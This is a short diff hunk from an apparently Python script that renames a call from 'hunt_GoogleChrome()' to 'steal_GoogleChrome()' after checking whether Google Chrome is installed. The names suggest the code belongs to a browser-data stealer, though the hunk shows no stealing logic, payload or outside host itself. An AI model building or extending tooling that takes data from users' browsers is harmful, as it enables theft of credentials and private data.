@@ -104,7 +104,7 @@ print()
 
 at_least_one = False
 if "Google Chrome" in installed_browsers:
-    if hunt_GoogleChrome():
+    if steal_GoogleChrome():
         at_least_one = True
 
 if at_least_one:
